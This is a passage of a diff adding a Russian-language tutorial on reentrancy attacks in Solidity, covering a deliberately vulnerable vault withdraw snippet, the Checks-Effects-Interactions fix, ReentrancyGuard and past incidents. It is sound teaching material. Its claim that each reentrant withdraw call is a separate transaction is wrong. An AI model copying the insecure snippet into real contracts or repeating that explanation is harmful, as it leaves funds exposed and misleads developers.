+    <span class="pl-k">if</span> (member.balance <span class="pl-k">&gt;</span> <span class="pl-c1">0</span> <span class="pl-k">&amp;&amp;</span> totalVaultBalance <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>) {
+        member.balance <span class="pl-k">-=</span> amount;
+        totalVaultBalance <span class="pl-k">-=</span> amount;
+    }</pre>
+ </div>
+ <p dir="auto">
+  Вот как работает эта логика:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Вычитание member.balance и totalVaultBalance выполняется только в том случае, если их значения
+                больше нуля.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Это гарантирует, что контракт не попытается вычесть отрицательные остатки, тем самым
+                предотвращая арифметическое переполнение.
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  Если мы запустим тест после внесения изменений, то увидим, что злоумышленник успешно сливает эфиры из
+        хранилища, в итоге у него оказывается значительно больше эфира, чем он изначально вложил, несмотря на то, что в
+        начале он внес в хранилище всего 1 ETH.
+ </p>
+ <p dir="auto">
+  Запуск эксплойта после исправления кода:
+  <a href="https://private-user-images.githubusercontent.com/146094679/423263853-b9479b80-b8ef-4b16-8128-40ab2d8c8697.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDUxNDg5MTIsIm5iZiI6MTc0NTE0ODYxMiwicGF0aCI6Ii8xNDYwOTQ2NzkvNDIzMjYzODUzLWI5NDc5YjgwLWI4ZWYtNGIxNi04MTI4LTQwYWIyZDhjODY5Ny5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNDIwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDQyMFQxMTMwMTJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02NzhlZWU3Mjk2ODMxYzA5MjhlODRhZTA3MzRhODg2YjhiYTZiY2ZkZThiM2UxYzgxOTkzYzI5MTEwNGI2ZTIzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VZd521g8r9X52CV3kGIyBLKYYLG9M4HfpYylpaB9Qnw" rel="noopener noreferrer" target="_blank">
+   <img alt="pusk1" src="https://private-user-images.githubusercontent.com/146094679/423263853-b9479b80-b8ef-4b16-8128-40ab2d8c8697.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDUxNDg5MTIsIm5iZiI6MTc0NTE0ODYxMiwicGF0aCI6Ii8xNDYwOTQ2NzkvNDIzMjYzODUzLWI5NDc5YjgwLWI4ZWYtNGIxNi04MTI4LTQwYWIyZDhjODY5Ny5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNDIwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDQyMFQxMTMwMTJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02NzhlZWU3Mjk2ODMxYzA5MjhlODRhZTA3MzRhODg2YjhiYTZiY2ZkZThiM2UxYzgxOTkzYzI5MTEwNGI2ZTIzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VZd521g8r9X52CV3kGIyBLKYYLG9M4HfpYylpaB9Qnw" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Я хотел обратить внимание на эту ошибку, потому что она является важной деталью для понимания того,
+        как работает система транзакций Ethereum
+        и почему тестирование в реальной сети ведет себя иначе, чем в контролируемой среде.
+ </p>
+ <p dir="auto">
+  В реальной сети, если во время транзакции возникает исключение, например, попытка вывести эфир с
+        пустого баланса, вся транзакция будет отменена.
+        Это означает, что злоумышленник не сможет сохранить эфир, который он пытался вывести в данной конкретной
+        транзакции.
+ </p>
+ <p dir="auto">
+  Транзакции Ethereum работают атомарно, а это значит, что если какая‑либо часть транзакции завершится
+        неудачей (например, выбросом исключения),
+        сеть полностью вернет состояние к тому, которое было до начала транзакции. Это включает в себя отмену всех
+        переводов эфира, сделанных во время транзакции.
+ </p>
+ <p dir="auto">
+  Однако если атака уже израсходовала эфир в предыдущих итерациях до того, как возникло исключение, эти
+        успешные переводы останутся у злоумышленника.
+        Каждый успешный вызов функции withdraw рассматривается как отдельная независимая транзакция и не может быть
+        отменен задним числом. Исключение затрагивает только ту транзакцию,
+        в которой произошла ошибка, оставляя ранее похищенные средства нетронутыми.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Устранение уязвимости реентерабельности
+  </h3>
+ </div>
+ <p dir="auto">
+  Теперь, когда мы изучили, как работает эта уязвимость, и проверили ее в действии, пришло время
+        сосредоточиться на ее устранении,
+        чтобы обеспечить безопасную работу смарт‑контракта. Атаки реентерабельности полагаются на последовательность
+        операций,
+        поэтому наша главная цель — перестроить уязвимую функцию, чтобы предотвратить рекурсивные вызовы.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Паттерн “Проверки-Эффекты-Взаимодействие”
+  </h4>
+ </div>
+ <p dir="auto">
+  Паттерн «Проверки‑Эффекты‑Взаимодействия» (Checks‑Effects‑Interactions) — это хорошо известная лучшая
+        практика в разработке смарт‑контрактов. Он включает в себя:
+ </p>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Проверки:
+    </strong>
+    Проверяйте условия ввода и соблюдение правил в начале функции.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Эффекты (изменения данных):
+    </strong>
+    Обновите переменные состояния контракта, чтобы
+                отразить предполагаемые изменения.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Взаимодействия:
+    </strong>
+    Передавайте эфир или взаимодействуйте с внешними контрактами
+                только после обновления переменных состояния.
+   </p>
+  </li>
+ </ol>
+ <p dir="auto">
+  В контексте контракта PiratesGuildVault уязвимость возникает из‑за передачи эфира вызывающей стороне
+        (msg.sender) до обновления баланса пользователя и общего баланса хранилища.
+        Чтобы исправить это, мы должны убедиться, что балансы обновляются перед передачей эфира.
+ </p>
+ <p dir="auto">
+  Вот обновленная функция withdraw, в которой реализовано исправление:
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">function<span class="pl-en"> withdraw</span></span>(<span class="pl-c1">uint256</span> <span class="pl-v">amount</span>) <span class="pl-k">external</span> onlyMembers {
+        Member <span class="pl-k">storage</span> member <span class="pl-k">=</span> guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>];
+        <span class="pl-k">require</span>(amount <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>, <span class="pl-s">"<span class="pl-s">Withdrawal amount must be greater than zero!</span>"</span>);
+        <span class="pl-k">require</span>(
+            member.balance <span class="pl-k">&gt;=</span> amount,
+            <span class="pl-s">"<span class="pl-s">Not enough balance in your treasure account!</span>"</span>
+        );
+    
+        <span class="pl-c">// Обновление баланса перед передачей эфира</span>
+        member.balance <span class="pl-k">-=</span> amount;
+        totalVaultBalance <span class="pl-k">-=</span> amount;
+    
+        <span class="pl-c">// Передача эфира после обновления состояния</span>
+        (<span class="pl-c1">bool</span> <span class="pl-v">success</span>, ) <span class="pl-k">=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>.<span class="pl-c1">call</span>{value: amount}(<span class="pl-s">""</span>);
+        <span class="pl-k">require</span>(success, <span class="pl-s">"<span class="pl-s">Failed to send Ether!</span>"</span>);
+    }</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Почему это исправление работает
+  </h4>
+ </div>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Обновление состояния в первую очередь:
+    </strong>
+    уменьшая баланс перед передачей эфира,
+                любые реентерабельные вызовы, выполняемые злоумышленником,
+                не пройдут проверку require, так как баланс больше не будет соответствовать требуемым условиям.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Защищенное внешнее взаимодействие:
+    </strong>
+    Передача эфира происходит только после
+                полного обновления состояния контракта, что позволяет разорвать цикл, обеспечивающий реентерабельность.
+   </p>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Еще немного лучших практик
+  </h4>
+ </div>
+ <p dir="auto">
+  Хотя паттерн «Проверки‑Эффекты‑Взаимодействия» значительно снижает риск реентерабельности,
+        разработчикам также следует:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Использование ReentrancyGuard:
+    </strong>
+    ReentrancyGuard OpenZeppelin — это утилита,
+                которая предотвращает реентерабельные вызовы, блокируя функцию во время выполнения.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Избегать call при переводе эфира:
+    </strong>
+    Используйте transfer или send, которые
+                обеспечивают фиксированные затраты газа, хотя в некоторых сценариях для лучшей совместимости может
+                потребоваться call.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Проводить аудит и тестирование:
+    </strong>
+    Обеспечьте тщательное тестирование, например,
+                автоматизированные тесты, которые мы демонстрировали ранее, чтобы убедиться, что уязвимость устранена.
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Известные случаи атак на основе Reentrancy
+  </h3>
+ </div>
+ <ol dir="auto">
+  <li>
+   <strong>
+    Rari Capital
+   </strong>
+   – пример атаки с анализом последствий:
+   <a href="https://blog.solidityscan.com/rari-capital-re-entrancy-vulnerability-analysis-25df2bbfc803" rel="nofollow">
+    Анализ атаки
+   </a>
+  </li>
+  <li>
+   <strong>
+    Orion Protocol
+   </strong>
+   – подробности инцидента и пробела в защите:
+   <a href="https://blog.solidityscan.com/orion-protocol-hack-analysis-missing-reentrancy-protection-f9af6995acb3" rel="nofollow">
+    Анализ атаки
+   </a>
+  </li>
+ </ol>
+ <p dir="auto">
+  Reentrancy остаётся одной из самых критичных и известных уязвимостей в смарт-контрактах.
+        Внимательное проектирование логики и использование проверенных шаблонов разработки помогут защитить ваши dApp от
+        подобных атак.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Заключение
+  </h2>
+ </div>
+ <p dir="auto">
+  Атаки реентерабельности подчеркивают критическую потребность в методах написания защищенного кода при
+        разработке смарт‑контрактов.
+        В этой главе было показано, как возникают эксплойты реентерабельности, как их тестировать с помощью Foundry и
+        почему для надежной защиты необходима автоматизация.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Основные выводы
+  </h4>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Главная причина уязвимости:
+    </strong>
+    Атаки реентерабельности используют отправку эфира
+                перед обновлением переменных состояния, что позволяет рекурсивным вызовам взимать средства больше
+                допустимого.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Тестирование в действии:
+    </strong>
+    Моделирование атаки с помощью Foundry позволило
+                обнаружить уязвимость и подчеркнуть важность автоматизированного тестирования для реальных сценариев.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Превентивные меры:
+    </strong>
+    Применение паттерна «Проверки‑Следствия‑Взаимодействия» и
+                обновление переменных состояния перед передачей уменьшает этот риск.
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  Понимая и устраняя такие уязвимости, как реентерабельность, разработчики могут создавать более
+        защищенные и устойчивые смарт‑контракты,
+        способствующие повышению надежности и доверия к децентрализованным системам.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Ресурсы
+  </h2>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Foundry — быстрый, модульный и портативный фреймворк для Ethereum. Документацию Foundry можно
+                найти по адресу:
+    <a href="https://book.getfoundry.sh/" rel="nofollow">
+     https://book.getfoundry.sh/
+    </a>
+    .
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Solidity — язык для разработки смарт‑контрактов. Документацию Solidity можно найти по адресу:
+    <a href="https://docs.soliditylang.org/" rel="nofollow">
+     https://docs.soliditylang.org/
+    </a>
+    .
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Атаки на реентерабельность — понимание и предотвращение реентерабельности. Документацию
+                «Solidity: Security Considerations» можно найти по адресу:
+    <a href="https://docs.soliditylang.org/en/v0.8.0/security%E2%80%91considerations.html#re%E2%80%91entrancy" rel="nofollow">
+     https://docs.soliditylang.org/en/v0.8.0/security‑considerations.html#re‑entrancy
+    </a>
+    .
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    OpenZeppelin — библиотеки безопасных смарт‑контрактов. Документацию по контрактам OpenZeppelin
+                можно найти по адресу:
+    <a href="https://docs.openzeppelin.com/contracts" rel="nofollow">
+     https://docs.openzeppelin.com/contracts
+    </a>
+    .
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Ethereum — блокчейн‑платформа с открытым исходным кодом для смарт‑контрактов. Документацию
+                Ethereum можно найти по адресу:
+    <a href="https://ethereum.org/en/whitepaper/" rel="nofollow">
+     https://ethereum.org/en/whitepaper/
+    </a>
+    .
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Тестирование смарт‑контрактов Ethereum — лучшие практики с Foundry. Соответствующую
+                документацию можно найти по адресу:
+    <a href="https://book.getfoundry.sh/tutorials/testing" rel="nofollow">
+     https://book.getfoundry.sh/tutorials/testing
+    </a>
+    .
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Атаки реентерабельности в смарт-контрактах: Разбираемся, что это и как с этим бороться:
+    <a href="https://habr.com/ru/companies/otus/articles/887598/" rel="nofollow">
+     https://habr.com/ru/companies/otus/articles/887598/
+    </a>
+   </p>
+  </li>
+ </ul>
+</article>
